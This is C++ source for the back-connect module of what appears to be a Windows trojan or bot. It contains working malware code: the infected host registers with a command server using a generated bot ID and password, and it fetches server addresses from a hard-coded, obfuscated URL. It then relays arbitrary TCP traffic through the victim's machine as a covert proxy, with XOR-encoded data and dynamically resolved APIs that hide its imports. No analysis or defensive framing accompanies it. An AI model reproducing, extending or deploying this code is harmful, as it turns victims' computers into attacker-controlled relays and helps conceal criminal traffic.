#include <winsock2.h>
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Crypt.h"
#include "Loader.h"
#include "BackConnect.h"

#define MAX_CONN 256

#pragma pack( push, 1 )

typedef struct TPkt
{
	char QType;
	unsigned short dwReserved;
	unsigned short dwLen;
} *PPkt;


typedef struct THostInfo
{
	PCHAR IP;
	int Port;
}* PHostInfo;


typedef struct ThreadConnection
{
	ULONG ip;
	USHORT port;
	USHORT bid;
	USHORT cid;
	SOCKET thread_s;
	SOCKET s;
	HANDLE hThread;
} *PThreadConnection;

#pragma pack( pop )

typedef struct Connections
{
	SOCKET Socket;
	HANDLE hStd;
	DWORD dwTerminated;
	DWORD dwStatus;
} CONNECTIONS, *PCONNECTIONS;

typedef struct 
{
	char *Server;
	int	  Port;
} BCCONNECT, *PBCCONNECT;


int iTimer;
HANDLE hTimerThread = NULL;
LPVOID pTimer;

bool KillBot = true;
bool SetBot  = true;


#define HTONS(x) (((x) << 8) | ((x) >> 8))

ThreadConnection Connections[ MAX_CONN ] = {0};

DWORD dwConnections = 0;
LONG dwBid		    = 0;

HANDLE hThreadMutex;
HANDLE hSockMutex;


bool WaitRecv( SOCKET Socket, DWORD dwTimeout )
{
	FD_SET FileDesc;
	TIMEVAL TimeVal;

	TimeVal.tv_sec  = dwTimeout;
	TimeVal.tv_usec = 0;

	FileDesc.fd_count	 = 1;
	FileDesc.fd_array[0] = Socket;

	int r = (int)pselect( 0, &FileDesc, NULL, NULL, &TimeVal );

	if ( r == SOCKET_ERROR || r == 0 )
	{
		return false;
	}

	return true;
}

bool NetSend( SOCKET Socket, char *Buffer, DWORD dwBufferLen )
{
	int r = 0;

	while ( dwBufferLen > 0 )
	{
		if ( ( r = (int)psend( Socket, (const char*)Buffer, dwBufferLen, 0 ) ) == SOCKET_ERROR )
		{
			return false;
		}

		if ( !r ) 
		{
			return false;
		}

		Buffer	 += r;
		dwBufferLen -= r;
	}

	return true;
}

bool NetRecv( SOCKET Socket, char *Buffer, DWORD dwBufferLen )
{
	int r = 0;

	while ( dwBufferLen > 0 )
	{

		if ( ( r = (int)precv( Socket, Buffer, dwBufferLen, 0 ) ) == SOCKET_ERROR )
		{
			return false;
		}

		if ( !r ) 
		{
			return false;
		}

		Buffer		+= r;
		dwBufferLen -= r;
	}

	return true;
}

DWORD NetRecvUntilDisconn( SOCKET Socket, char *Buffer, DWORD dwBufferLen )
{
	int r = 0;

	DWORD BufferLenCp = dwBufferLen;

	while ( dwBufferLen > 0 )
	{
		if ( ( r = (int)precv( Socket, Buffer, (int)dwBufferLen, 0 ) ) == SOCKET_ERROR )
		{
			return 0;
		}

		if ( !r )
		{
			return BufferLenCp - dwBufferLen;
		}

		Buffer		+= r;
		dwBufferLen -= r;
	}

	return BufferLenCp - dwBufferLen;
}

SOCKET NetConnect( char *Host, int Port )
{
	int ip = (int)pinet_addr( (const char*)Host );

	if ( ip == (int)INADDR_NONE )
	{
		LPHOSTENT rhost = (LPHOSTENT)pgethostbyname( (const char*)Host );

		if ( !rhost )
		{
			return -1;
		}

		ip = *(long*)( rhost )->h_addr_list[0];

		if ( !ip )
		{
			return -1;
		}
	}

	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

	if ( Socket == INVALID_SOCKET ) 
	{
		return -1;
	}

	LINGER l;

	l.l_linger = 3;
	l.l_onoff  = 1;

	psetsockopt( Socket, SOL_SOCKET, SO_LINGER, (char*)&l, sizeof( l ) );

	struct sockaddr_in SockAddr;

	m_memset( &SockAddr, 0, sizeof( SockAddr ) );

	SockAddr.sin_family			  = AF_INET;
	SockAddr.sin_port			  = HTONS( Port );
	SockAddr.sin_addr.S_un.S_addr = ip;

	if ( (int)pconnect( Socket, (sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket( Socket );
		return -1;
	}

	return Socket;
}

int FindConn( USHORT uBid )
{
	for ( DWORD i = 0; i < dwConnections; i++ )
	{
		if ( Connections[i].bid == uBid )
		{
			return i;
		}
	}

	return -1;
}

void KillAllConnections()
{
	pWaitForSingleObject( hThreadMutex, INFINITE );

	for ( DWORD i = 0; i < dwConnections; i++ )
	{
		ThreadConnection Conn = Connections[ i ];

		pshutdown( Conn.thread_s, FD_READ );
		pshutdown( Conn.thread_s, SD_SEND );

		pclosesocket( Conn.thread_s );
	}

	m_memset( &Connections, 0, sizeof( ThreadConnection ) * dwConnections );

	dwConnections = 0;

	pReleaseMutex( hThreadMutex );

	return;
}

bool SendStatus( SOCKET Socket, USHORT uBid, USHORT uCid, BOOL bOk )
{				
	TPkt tPacket;

	tPacket.QType	   = 0x63;
	tPacket.dwLen	   = 3;
	tPacket.dwReserved = uCid;

	char Status[3];

	Status[0] = bOk;

	*(PWORD)&Status[1] = uBid;		

	if ( !NetSend( Socket, (char*)&tPacket, sizeof( tPacket ) ) )
	{
		return false;
	}

	if ( !NetSend( Socket, Status, 3 ) )
	{
		return false;
	}

	return true;
}

void DisconnBid( USHORT uBid )
{
	pWaitForSingleObject( hThreadMutex, INFINITE );

	int k = FindConn( uBid );

	if ( k != -1 )
	{
		ThreadConnection Conn = Connections[ k ];

		Connections[ k ].thread_s = INVALID_SOCKET;

		if ( Conn.thread_s != INVALID_SOCKET )
		{
			pshutdown( Conn.thread_s, FD_READ );
			pshutdown( Conn.thread_s, SD_SEND );

			pclosesocket( Conn.thread_s );
		}

		dwConnections--;

		if ( dwConnections )
		{
			Connections[ k ] = Connections[ dwConnections ];
		}
	}

	pReleaseMutex( hThreadMutex );

}

void BcDecrypt( char *d, int t )
{
	for ( int i = 0; i < t; i++ )
	{
		*d = *d ^ 77;
		d++;
	}
}

DWORD WINAPI ConnectionThread( LPVOID lpData )
{
	int bid = (int)lpData;

	ThreadConnection Conn;
	pWaitForSingleObject( hThreadMutex, INFINITE );

	int k = FindConn( bid );

	if ( k != -1 )
	{
		Conn = Connections[ k ];
	}

	pReleaseMutex(hThreadMutex);

	if ( k != -1 )
	{
		if ( Conn.thread_s != INVALID_SOCKET )
		{
			pWaitForSingleObject( hThreadMutex, INFINITE );

			k = FindConn( bid );

			if ( k != -1 )
			{
				Connections[ k ].thread_s = Conn.thread_s;
			}

			pReleaseMutex( hThreadMutex );

			pWaitForSingleObject( hSockMutex, INFINITE );

			SendStatus( Conn.s, bid, Conn.cid, TRUE );

			pReleaseMutex( hSockMutex );

			char data[1024];

			while ( 1 )
			{
				int r = (int)precv( Conn.thread_s, data, 1024, 0 );

				if ( r == 0 || r == SOCKET_ERROR )
				{
					pWaitForSingleObject( hSockMutex, INFINITE );

					TPkt tPacket;

					tPacket.dwLen		 = 0;
					tPacket.QType	 = 0x77;
					tPacket.dwReserved = bid;
					
					NetSend( Conn.s, (char*)&tPacket, sizeof( tPacket ) );

					pReleaseMutex( hSockMutex );

					break;
				}

				pWaitForSingleObject( hSockMutex, INFINITE );

				TPkt tPacket;

				tPacket.dwLen	   = r;
				tPacket.QType	   = 0x73;
				tPacket.dwReserved = bid;

				NetSend( Conn.s, (char*)&tPacket, sizeof( tPacket ) );

				BcDecrypt( data, r );
				
				if ( !NetSend( Conn.s, data, r ) ) 
				{
					pReleaseMutex( hSockMutex );
					break;
				}
				pReleaseMutex( hSockMutex );
			}
		} 
		else
		{
			SendStatus( Conn.s, bid, Conn.cid, FALSE );
		}
	}

	DisconnBid( bid );

	return 0;
}


void ManageNewConnection( SOCKET Socket, ULONG uIP, USHORT uCid, USHORT uPort)
{
	pWaitForSingleObject( hThreadMutex, INFINITE );

	 if ( dwConnections < MAX_CONN )
	 {
		  Connections[ dwConnections ].thread_s = INVALID_SOCKET;
		  Connections[ dwConnections ].s   = Socket;
		  Connections[ dwConnections ].ip   = uIP;
		  Connections[ dwConnections ].port  = uPort;
		  Connections[ dwConnections ].cid  = uCid;
		  Connections[ dwConnections ].bid  = (USHORT)dwBid + 1;

		  in_addr in;
		  in.S_un.S_addr = uIP;
		  Connections[ dwConnections ].thread_s  = NetConnect( (char*)pinet_ntoa( in ), uPort );

		  dwBid++;

		  DWORD ThreadId = 0;
		  dwConnections++; 


		  Connections[ dwConnections - 1 ].hThread = pCreateThread( NULL, 0, ConnectionThread, (void*)Connections[ dwConnections - 1 ].bid, 0, &ThreadId );
	 }

	 pReleaseMutex( hThreadMutex );
}

#define MIN(a,b)((a)>(b)?(b):(a))

void SessionWork( SOCKET Socket )
{
	PCONNECTIONS pConnect = (PCONNECTIONS)MemAlloc( sizeof( PCONNECTIONS ) );

	m_memset( pConnect, 0, sizeof( PCONNECTIONS ) );

	char *Data = NULL;

	while ( 1 )
	{
		if ( !WaitRecv( Socket, 60*60 ) )
		{
			break;
		}

		TPkt tPacket;

		if ( !NetRecv( Socket, (char*)&tPacket, sizeof( tPacket ) ) )
		{
			break;
		}

		if ( tPacket.QType == 0x63 )
		{

			if ( tPacket.dwLen != 6 )
			{
				break;
			}

			if ( Data )
			{
				MemFree( Data );
			}

			Data = (char *)MemAlloc( tPacket.dwLen + 1 );

			if ( Data == NULL )
			{
				break;
			}

			if ( !NetRecv( Socket, Data, tPacket.dwLen ) )
			{
				break;
			}

			ManageNewConnection( Socket, *(ULONG*)Data, (USHORT)tPacket.dwReserved, *(USHORT*)&Data[4] );
		}
		else if ( tPacket.QType == 0x73 )
		{
			if ( Data )
			{
				MemFree( Data );
			}

			Data = (char *)MemAlloc( tPacket.dwLen + 1 );

			if ( Data == NULL )
			{
				break;
			}

			if ( !NetRecv( Socket, Data, tPacket.dwLen ) )
			{
				break;
			}
			
			BcDecrypt( Data, tPacket.dwLen );

			ThreadConnection Conn;
			pWaitForSingleObject( hThreadMutex, INFINITE );

			int k = FindConn( (USHORT)tPacket.dwReserved );

			if ( k != -1 )
			{
				Conn = Connections[ k ];
				NetSend( Conn.thread_s, Data, tPacket.dwLen );
			}

			pReleaseMutex( hThreadMutex );
		}
		else if ( tPacket.QType == 0x77 )
		{
			DisconnBid( tPacket.dwReserved );
		} 
		else if ( tPacket.QType == 0x64 )
		{
			pclosesocket(Socket);
			KillAllConnections();
			pExitThread( 1 );			
			break;
		} 
		else if ( tPacket.QType == 0x65 )
		{
		} 
		else
		{
			break;
		}
	}

	if ( Data )
	{
		MemFree( Data );
	}

	pConnect->dwStatus = 1;
}

void InitSession( char *Host, int Port, char *Uid, char *Password )
{
	char Buffer[ 1024 ];

	int r = 0;
	SOCKET Socket = NetConnect( Host, Port );

	if ( Socket != INVALID_SOCKET )
	{
		r = NetRecv( Socket, Buffer, 6 );

		if ( r )
		{
			Buffer[ 6 ] = 0;

			if ( !m_lstrncmp( Buffer, "HELLO\n", 6 ) )
			{
				typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
				fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

				_pwsprintfA( Buffer, "%s:%s\n", Uid, Password );

				NetSend( Socket, Buffer, m_lstrlen( Buffer ) );

				if ( NetRecv( Socket, Buffer, 6 ) )
				{
					Buffer[ 6 ] = 0;

					if ( !m_lstrncmp( Buffer, "READY\n", 6 ) )
					{
						SessionWork( Socket );		
					}
				}
			}
		}

		pclosesocket( Socket );
	}
}

int SendGetQuery( char *Host, int Port, char *Uid, char *Password )
{
	int r = -1;

	char Data[1024];

	char Request[] = "GET /stat?uptime=%d&downlink=%d&uplink=%d&id=%s&statpass=%s&comment=%s HTTP/1.0\r\n\r\n";

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	_pwsprintfA( Data, Request, 0, 0, 0, Uid, Password, NULL );

	SOCKET Socket = NetConnect( Host, Port );

	if ( Socket != INVALID_SOCKET )
	{
		NetSend( Socket, Data, m_lstrlen( Data ) );

		m_memset( Data, 0, sizeof( Data ) );

		int r = NetRecvUntilDisconn( Socket, Data, sizeof( Data ) );

		if ( r )
		{
			Data[ r ] = 0;

			char *Status = NULL;

			for ( DWORD i = 0; Data[i] != 0; ++i )
			{
				if ( ( Data[ i ]	 == '\r' ) && ( Data[ i + 1 ] == '\n' )
				   &&( Data[ i + 2 ] == '\r' ) && ( Data[ i + 3 ] == '\n' ) )
				{
					Status = (char*)&Data[i] + 4;
					break;
				}
			}

			m_lstrlwr( Status );

			char Cmd_ok[] = {'o','k',0};
			char Cmd_bp[] = {'b','a','d','p','a','s','s',0};
			char Cmd_sn[] = {'s','e','s','s','i','o','n',':',0};

			if ( !m_lstrncmp( Status, Cmd_ok, m_lstrlen( Cmd_ok ) ) )
			{
				r = 0;				
			}
			else if ( !m_lstrncmp( Status, Cmd_bp, m_lstrlen( Cmd_bp ) ) )
			{
				r = -2;
			}
			else if ( !m_lstrncmp( Status, Cmd_sn, m_lstrlen( Cmd_sn ) ) )
			{
				Status += m_lstrlen( Cmd_sn );

				int Port = m_atoi( Status );

				if ( Port > 0 )
				{
					InitSession( Host, Port, Uid, Password );
					r = 5;
				}
			}
		}

		pclosesocket( Socket );
	}


	return r;
}

DWORD WINAPI BackConnectThread( LPVOID lpData )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return 0;
	}

    PHostInfo Host = PHostInfo(lpData);

	char Uid[100];
	GenerateUid( Uid );

	hThreadMutex = pCreateMutexA( NULL, FALSE, NULL );
	hSockMutex   = pCreateMutexA( NULL, FALSE, NULL );

	char Password[] = {'b','p','a','s','s',0};

	while ( 1 )
	{
		SendGetQuery( Host->IP, Host->Port, Uid, Password );
		pSleep( 1000 * 60 * 5 );		
	}

	STR::Free(Host->IP);
    FreeStruct(Host);

	return 0;
}


DWORD WINAPI BackConnectThread2( LPVOID lpData )
{
	DWORD dwTemp	   = (DWORD)lpData;
	BCCONNECT pConnect = *((PBCCONNECT)dwTemp);

	char Uid[100];
	GenerateUid( Uid );

	hThreadMutex = pCreateMutexA( NULL, FALSE, NULL );
	hSockMutex   = pCreateMutexA( NULL, FALSE, NULL );

	char Password[] = {'b','p','a','s','s',0};

	int iResult = 0;

	while ( 1 )
	{
		iResult++;

		if ( SendGetQuery( pConnect.Server, pConnect.Port, Uid, Password ) == 5 )
		{
			iResult = 0;
		}

		if ( iResult == 3 || !KillBot )
		{
			break;
		}
	
		pSleep( 1000 * 30 * 1 );		
	}

	return 0;					 
}


DWORD WINAPI RunTimer( LPVOID lpData )
{
	int iCount = 0;

	while ( 1 )
	{
		pWaitForSingleObject( hTimerThread, 1000 * 60 * 1 );//60 раз проверяем не поставлен ли флаг об бднулении

		iCount += 1;

		if ( iCount >= 60 ) 
		{
			iTimer = 0;
			iCount = 0;
		}

		if ( !SetBot )
		{
			SetBot = true;
			iCount = 0;
		}
	}

	return 0;
}

DWORD WINAPI GetServerForBackConnect( LPVOID lpData )
{
	WSADATA wsa;
	pWSAStartup( MAKEWORD( 1, 1 ), &wsa );

	HANDLE hThread  = NULL;
	DWORD dwCurrent = 0;

	char Sleep[] = {'s','l','e','e','p',0};
	char Url[]   = {'h','t','t','p',':','/','/','c','l','i','e','n','t','.','v','z','l','o','m','.','b','i','z','/','s','o','c','k','s','/','t','o','g','o','.','h','t','m','l',0};

	while ( 1 )
	{
		char *Buffer = GetInfoFromBcServer( Url );

		if ( Buffer != NULL )
		{
			char *Context;

			m_lstrlwr( Buffer );
			m_strtok_s( Buffer, "\r\n", &Context );

			if ( !m_lstrncmp( Buffer, Sleep, m_lstrlen( Sleep ) ) )
			{
				DWORD dwSleepTime = m_atoi( Buffer + m_lstrlen( Sleep ) + 1 );
				pSleep( dwSleepTime * 60 * 1000 );
			}
			else
			{
				char *Port = NULL;

				m_strtok_s( Buffer, ":", &Port );

				if ( CalcHash( Buffer ) != dwCurrent )
				{
					PBCCONNECT pConnect = (PBCCONNECT)MemAlloc( sizeof( PBCCONNECT ) );

					if ( pConnect != NULL )
					{
						pConnect->Server = Buffer;
						pConnect->Port	 = m_atoi( Port );

						if ( hThread != NULL )
						{
							pTerminateThread( hThread, NULL );
						}

						hThread = StartThread( BackConnectThread2, pConnect );
						pWaitForSingleObject( hThread, INFINITE );

						if ( !KillBot ) 
						{
							pSleep( 5 * 60 * 1000 );

							KillBot = true;
							iTimer  = 0;
						}
					}
				}
			}
		}

		pSleep( 1000 * 60 * 1 );
	}

	if ( hTimerThread != NULL )
		pCloseHandle( hTimerThread );

	return 0;
}

//----------------------------------------------------------------------------
bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
{
	PHostInfo H = CreateStruct(THostInfo);

	H->IP = STR::GetLeftStr(Arguments, ":");

	PCHAR Port = STR::GetRightStr(Arguments, ":");
	if (Port != NULL)
		H->Port = StrToInt(Port);
	STR::Free(Port);


	if (H->IP == NULL || H->Port == 0)
	{
		STR::Free(H->IP);
		FreeStruct(H);
		return false;
    }

	return StartThread(BackConnectThread, H) != NULL;
}




